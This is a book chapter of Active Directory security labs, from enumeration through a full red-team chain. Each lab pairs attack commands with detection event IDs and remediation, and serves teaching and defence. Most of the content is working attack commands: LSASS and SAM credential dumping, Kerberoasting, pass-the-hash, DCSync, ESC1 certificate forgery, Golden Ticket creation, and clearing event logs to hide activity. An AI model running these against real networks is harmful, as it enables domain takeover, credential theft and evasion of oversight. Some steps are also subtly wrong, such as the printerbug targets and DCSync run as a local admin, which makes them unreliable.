# Chapter 19: Practical Labs

Practical labs are essential for mastering Active Directory security. They provide a safe, controlled environment to practice offensive and defensive techniques without the risk of disrupting production systems. This chapter outlines several hands-on labs, ranging from beginner to advanced levels, to help you apply the concepts learned in previous chapters.

## Lab Environment Setup

Before starting the labs, ensure you have a suitable lab environment.

### Recommended Setup
- **Virtualization Software**: VMware Workstation or VirtualBox.
- **Domain Controller**: Windows Server 2019/2022 with Active Directory Domain Services (AD DS) installed. Create a domain (e.g., `contoso.com`).
- **Client Machines**: At least two Windows 10/11 machines joined to the domain.
- **Attack Machine**: Kali Linux or Windows 10/11 with security tools installed (e.g., Mimikatz, BloodHound, Impacket, Rubeus, CrackMapExec).
- **Network**: All machines should be on the same virtual network (e.g., Host-Only or Internal Network) and able to communicate with each other.

### Basic Configuration
- **Users**: Create several users with different privilege levels (e.g., standard users, service accounts, domain admins).
- **Groups**: Create various groups (e.g., Domain Admins, IT Support, Finance).
- **GPOs**: Create and link GPOs to OUs to simulate a real-world environment.
- **Services**: Install and configure services (e.g., IIS, MSSQL) to create Service Principal Names (SPNs) for Kerberoasting.
- **AD CS**: Install and configure Active Directory Certificate Services with vulnerable templates for AD CS attacks.

---

## Beginner Lab: Enumeration and Credential Dumping

### Objectives
- Enumerate the Active Directory domain.
- Identify users, groups, and computers.
- Dump credentials from LSASS and SAM.

### Environment
- Domain Controller (DC01)
- Client Machine (CLIENT01)
- Attack Machine (ATTACK01)

### Machines
- **DC01**: Windows Server 2019, Domain Controller for `contoso.com`.
- **CLIENT01**: Windows 10, joined to `contoso.com`. Logged in as `User1` (standard user).
- **ATTACK01**: Kali Linux or Windows 10.

### Attack Path
1. Log in to `CLIENT01` as `User1`.
2. Use PowerShell to enumerate the domain.
3. Use Mimikatz or procdump to dump LSASS memory.
4. Use reg.exe to dump the SAM database.

### Commands

**Step 1: Domain Enumeration (PowerShell on CLIENT01)**
```powershell
Get-ADUser -Filter * -Properties Description | Select-Object Name, SamAccountName, Description
Get-ADGroup -Filter * | Select-Object Name
Get-ADComputer -Filter * -Properties OperatingSystem | Select-Object Name, OperatingSystem
```

**Step 2: LSASS Dumping (PowerShell on CLIENT01)**
```powershell
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\temp\lsass.dmp full
```
*Transfer `lsass.dmp` to ATTACK01 and use Mimikatz to extract credentials.*
```text
# Mimikatz on ATTACK01
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

**Step 3: SAM Dumping (PowerShell on CLIENT01)**
```powershell
reg save hklm\sam C:\temp\sam.hive
reg save hklm\system C:\temp\system.hive
```
*Transfer `sam.hive` and `system.hive` to ATTACK01 and use secretsdump.py to extract local hashes.*
```bash
# secretsdump.py on ATTACK01
python3 secretsdump.py -sam sam.hive -system system.hive LOCAL
```

### Expected Results
- Successfully list users, groups, and computers.
- Extract plaintext passwords, NTLM hashes, and Kerberos tickets from LSASS.
- Extract local user NTLM hashes from the SAM database.

### Detection Opportunities
- **LSASS Dumping**: Event ID 10 (Sysmon) for process access to `lsass.exe` with full access (`0x1FFFFF`).
- **SAM Dumping**: Event ID 4656 (Handle to an object was requested) for access to the SAM hive.

### Solutions
- **Remediation**: Enable Windows Defender Credential Guard to isolate LSASS secrets. Restrict local admin privileges to prevent SAM dumping.

---

## Intermediate Lab: Kerberoasting and Pass-the-Hash

### Objectives
- Perform Kerberoasting to extract service account hashes.
- Use Pass-the-Hash to authenticate to remote services.
- Move laterally to the Domain Controller.

### Environment
- Domain Controller (DC01)
- Client Machine (CLIENT01)
- Server Machine (SERVER01)
- Attack Machine (ATTACK01)

### Machines
- **DC01**: Windows Server 2019, Domain Controller for `contoso.com`.
- **CLIENT01**: Windows 10, joined to `contoso.com`. Logged in as `User1` (standard user).
- **SERVER01**: Windows Server 2019, joined to `contoso.com`. Running MSSQL under the `svc_mssql` account.
- **ATTACK01**: Kali Linux or Windows 10.

### Attack Path
1. Log in to `CLIENT01` as `User1`.
2. Enumerate SPNs using PowerView.
3. Request a Service Ticket (ST) for the `svc_mssql` account (Kerberoasting).
4. Crack the ST hash offline to obtain the `svc_mssql` password.
5. Log in to `SERVER01` as `svc_mssql` and dump LSASS memory to obtain the local admin hash.
6. Use Pass-the-Hash to authenticate to `DC01` as the local admin and extract domain credentials (DCSync).

### Commands

**Step 1: SPN Enumeration (PowerShell on CLIENT01)**
```powershell
Get-DomainUser -SPN -Properties SamAccountName, ServicePrincipalName
```

**Step 2: Kerberoasting (PowerShell on CLIENT01)**
```powershell
# Using Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt /format:hashcat
# Or using Impacket (from ATTACK01)
python3 GetUserSPNs.py -request -dc-ip <DC01_IP> -outputfile hashes.txt contoso.com/User1:Password1
```
*Crack the hash using hashcat.*
```bash
hashcat -m 13100 hashes.txt rockyou.txt
```

**Step 3: LSASS Dumping on SERVER01 (PowerShell on SERVER01)**
*Log in to SERVER01 as svc_mssql (using the cracked password).*
```powershell
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\temp\lsass.dmp full
```
*Extract the local admin hash using Mimikatz.*

**Step 4: Pass-the-Hash and DCSync (PowerShell on ATTACK01)**
```bash
# Using CrackMapExec for PtH
crackmapexec smb <DC01_IP> -u Administrator -H <LocalAdminHash>
# Using Mimikatz for DCSync (from SERVER01 as local admin)
mimikatz # lsadump::dcsync /domain:contoso.com /user:krbtgt
```

### Expected Results
- Successfully extract and crack the `svc_mssql` hash.
- Dump LSASS memory on `SERVER01` to obtain the local admin hash.
- Authenticate to `DC01` using Pass-the-Hash.
- Extract the `krbtgt` hash using DCSync.

### Detection Opportunities
- **Kerberoasting**: Event ID 4769 (Kerberos service ticket was requested) for TGS-REQ with specific SPNs.
- **Pass-the-Hash**: Event ID 4624 (Logon success) with Logon Type 3 and AuthenticationPackageName `NTLM`.
- **DCSync**: Event ID 4662 (An operation was performed on an object) for DRS replication permissions.

### Solutions
- **Remediation**: Use strong, complex passwords for service accounts. Implement Managed Service Accounts (MSAs) or Group Managed Service Accounts (gMSAs). Enable SMB signing to prevent Pass-the-Hash. Restrict DCSync privileges.

---

## Advanced Lab: Delegation and AD CS Attacks

### Objectives
- Exploit unconstrained delegation to capture TGTs.
- Exploit constrained delegation to impersonate users.
- Exploit vulnerable AD CS templates (ESC1) to forge certificates.

### Environment
- Domain Controller (DC01)
- Client Machine (CLIENT01)
- Server Machine (SERVER01)
- Attack Machine (ATTACK01)

### Machines
- **DC01**: Windows Server 2019, Domain Controller for `contoso.com`.
- **CLIENT01**: Windows 10, joined to `contoso.com`. Logged in as `User1` (standard user).
- **SERVER01**: Windows Server 2019, joined to `contoso.com`. Configured for unconstrained delegation.
- **AD CS Server**: Windows Server 2019, joined to `contoso.com`. Running AD CS with a vulnerable template (ESC1).
- **ATTACK01**: Kali Linux or Windows 10.

### Attack Path
1. Log in to `CLIENT01` as `User1`.
2. Enumerate computers with unconstrained delegation.
3. Use printerbug.py to force DC01 to authenticate to SERVER01.
4. Extract the DC01 TGT from SERVER01 memory.
5. Use the TGT to perform DCSync and dump all domain credentials.
6. Enumerate AD CS templates and identify a vulnerable template (ESC1).
7. Request a certificate with a forged SAN (e.g., Domain Admin) using Certipy.
8. Authenticate to DC01 using the forged certificate.

### Commands

**Step 1: Unconstrained Delegation Enumeration (PowerShell on CLIENT01)**
```powershell
Get-DomainComputer -Unconstrained -Properties dnshostname
```

**Step 2: Force DC Authentication (PowerShell on ATTACK01)**
```bash
python3 printerbug.py contoso.com/User1:Password1@<SERVER01_IP> <CLIENT01_IP>
```
*Wait for DC01 to authenticate to SERVER01.*

**Step 3: Extract DC TGT (PowerShell on SERVER01)**
```powershell
# Using Mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```
*Identify the DC01 TGT (krbtgt/CONTOSO.COM).*

**Step 4: DCSync (PowerShell on SERVER01)**
```text
# Mimikatz
mimikatz # kerberos::ptt <DC_TGT_File>
mimikatz # lsadump::dcsync /domain:contoso.com /user:krbtgt
```

**Step 5: AD CS Enumeration (PowerShell on ATTACK01)**
```bash
python3 certipy find -username 'User1' -password 'Password1' -dc-ip <DC01_IP> -target <AD_CS_Server_IP>
```

**Step 6: Request Forged Certificate (PowerShell on ATTACK01)**
```bash
python3 certipy req -ca '<CA_Name>' -template 'VulnerableTemplate' -upn 'administrator@contoso.com' -username 'User1' -password 'Password1' -dc-ip <DC01_IP> -target <AD_CS_Server_IP>
```

**Step 7: Authenticate with Forged Certificate (PowerShell on ATTACK01)**
```bash
python3 certipy auth -pfx 'administrator.pfx' -dc-ip <DC01_IP> -username 'administrator' -domain 'contoso.com'
```

### Expected Results
- Successfully capture the DC01 TGT via unconstrained delegation.
- Extract the `krbtgt` hash using DCSync.
- Identify a vulnerable AD CS template.
- Forge a certificate to authenticate as a Domain Admin.

### Detection Opportunities
- **Unconstrained Delegation**: Event ID 4768 (Kerberos TGT requested) for DC01 authenticating to SERVER01.
- **AD CS Abuse**: Event ID 4886 (Certificate Services received a certificate request) for unusual SAN requests.

### Solutions
- **Remediation**: Disable unconstrained delegation. Use constrained delegation with proper SPN restrictions. Harden AD CS templates (disable SAN specification, restrict enrollment permissions).

---

## Professional Red Team Lab: Full Attack Chain

### Objectives
- Simulate a full red team engagement.
- Combine multiple techniques to achieve domain dominance.
- Practice operational security (OpSec) and defensive evasion.

### Environment
- Domain Controller (DC01)
- Client Machine (CLIENT01)
- Server Machine (SERVER01)
- AD CS Server
- Attack Machine (ATTACK01)

### Machines
- **DC01**: Windows Server 2019, Domain Controller for `contoso.com`.
- **CLIENT01**: Windows 10, joined to `contoso.com`. Logged in as `User1` (standard user).
- **SERVER01**: Windows Server 2019, joined to `contoso.com`. Running a vulnerable service.
- **AD CS Server**: Windows Server 2019, joined to `contoso.com`. Running AD CS.
- **ATTACK01**: Kali Linux or Windows 10.

### Attack Path
1. **Initial Access**: Gain access to `CLIENT01` (simulated).
2. **Reconnaissance**: Enumerate the domain using BloodHound/SharpHound.
3. **Privilege Escalation**: Identify and exploit a misconfiguration (e.g., weak ACL on a GPO) to gain local admin on `SERVER01`.
4. **Credential Theft**: Dump LSASS on `SERVER01` to obtain service account hashes.
5. **Lateral Movement**: Use Kerberoasting or constrained delegation to move to the AD CS Server.
6. **AD CS Exploitation**: Exploit a vulnerable AD CS template (ESC1) to forge a Domain Admin certificate.
7. **Domain Dominance**: Authenticate to `DC01` using the forged certificate and extract the `krbtgt` hash (DCSync).
8. **Persistence**: Create a Golden Ticket using the `krbtgt` hash to maintain persistent access.
9. **OpSec**: Clean up artifacts (clear logs, delete files) to avoid detection.

### Commands (Overview)

*This lab requires combining techniques from previous chapters. Below is a high-level overview of the commands.*

1. **SharpHound Collection**:
   ```powershell
   Invoke-BloodHound -CollectionMethod All -Domain contoso.com -OutputDirectory C:\Temp\BloodHound
   ```

2. **GPO Abuse (Privilege Escalation)**:
   ```powershell
   New-GPOImmediateTask -TaskName "Escalation" -Command "C:\temp\malicious.exe" -GPOName "VulnerableGPO"
   ```

3. **LSASS Dumping (Credential Theft)**:
   ```powershell
   rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\temp\lsass.dmp full
   ```

4. **Kerberoasting (Lateral Movement)**:
   ```powershell
   Rubeus.exe kerberoast /outfile:hashes.txt /format:hashcat
   ```

5. **AD CS Exploitation**:
   ```bash
   python3 certipy req -ca '<CA_Name>' -template 'VulnerableTemplate' -upn 'administrator@contoso.com'
   ```

6. **DCSync (Domain Dominance)**:
   ```text
   mimikatz # lsadump::dcsync /domain:contoso.com /user:krbtgt
   ```

7. **Golden Ticket (Persistence)**:
   ```text
   mimikatz # kerberos::golden /user:Administrator /domain:contoso.com /sid:<DomainSID> /krbtgt:<KRBTGT_Hash> /id:500 /ptt
   ```

8. **Artifact Reduction (OpSec)**:
   ```cmd
   wevtutil cl System
   wevtutil cl Security
   wevtutil cl Application
   del C:\temp\malicious.exe
   del C:\temp\lsass.dmp
   ```

### Expected Results
- Successfully traverse the attack path from a standard user to Domain Admin.
- Maintain persistent access using a Golden Ticket.
- Minimize the detection footprint through OpSec practices.

### Detection Opportunities
- **SharpHound**: Event ID 4662 (LDAP queries for sensitive attributes).
- **GPO Abuse**: Event ID 5136 (Directory service object was modified).
- **LSASS Dumping**: Event ID 10 (Sysmon) for process access to `lsass.exe`.
- **Kerberoasting**: Event ID 4769 (TGS-REQ for SPNs).
- **AD CS Exploitation**: Event ID 4886 (Certificate request with unusual SAN).
- **DCSync**: Event ID 4662 (DRS replication permissions).
- **Golden Ticket**: Event ID 4768 (TGT with unusually long lifetime).
- **Artifact Reduction**: Event ID 1102 (Security log was cleared).

### Solutions
- **Remediation**: Implement a comprehensive defense-in-depth strategy, including network segmentation, least privilege, regular auditing, and robust monitoring (SIEM/EDR). Follow the detection and mitigation recommendations provided in previous chapters.

---
*Practical labs provide the hands-on experience necessary to master Active Directory security. The next chapter will provide checklists to help you organize your assessments and ensure comprehensive coverage.*
